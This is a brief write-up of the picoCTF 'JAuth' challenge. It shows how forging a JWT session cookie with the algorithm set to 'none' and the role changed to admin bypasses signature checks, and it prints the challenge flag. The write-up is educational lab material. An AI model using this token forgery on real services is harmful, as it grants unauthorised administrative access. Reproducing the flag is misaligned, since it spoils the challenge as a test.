## JAuth

[Link to challenge](https://play.picoctf.org/practice/challenge/236)

Write-up:

1. Logging in as the test user allows us to see the session cookie. Decoding it 
gets us:

    ```json
    {
    "typ": "JWT",
    "alg": "HS256"
    }
    {
    "auth": 1757433546035,
    "agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "role": "user",
    "iat": 1757433546
    }
    ```

2. From previous experience, I attempted to change the `alg` to `"none"` and set
the `user` to admin, to test for flawed signature verification:

    ```json
    {
    "typ": "JWT",
    "alg": "none"
    }
    {
    "auth": 1757433546035,
    "agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "role": "admin",
    "iat": 1757433546
    }
    ```

    Re-encoding using [jwt.io/](https://www.jwt.io/) and setting as session cookie
    allows us to login as admin.

    Flag: **picoCTF{succ3ss_@u7h3nt1c@710n_3444eacf}**

**Note:** I'm not quite sure how the vulnerabilities in the challenge description
are related to this.